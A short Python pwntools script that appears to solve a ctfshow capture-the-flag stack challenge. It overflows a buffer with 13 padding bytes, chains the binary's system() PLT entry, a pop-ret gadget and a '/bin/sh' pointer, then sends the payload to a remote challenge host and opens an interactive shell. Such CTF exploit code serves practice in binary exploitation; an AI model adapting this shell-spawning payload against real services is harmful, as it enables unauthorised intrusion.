from pwn import *


def pwn02(file_name='/mnt/hgfs/CyberSecurity/PWN/ctfshow/stack'):
    io = process([file_name])
    io = remote('pwn.challenge.ctf.show', 28295)

    target_elf = ELF(file_name)

    system_plt = p32(target_elf.plt['system'])
    bin_sh_ptr = p32(next(target_elf.search(b'/bin/sh')))
    pop_ret_gadget = p32(0x08048379)  # pop ebx ; ret

    payload = b'A' * 13
    payload += system_plt + pop_ret_gadget + bin_sh_ptr

    # gdb.attach(io)
    io.sendline(payload)
    io.interactive()



if __name__ == '__main__':
    pwn02()
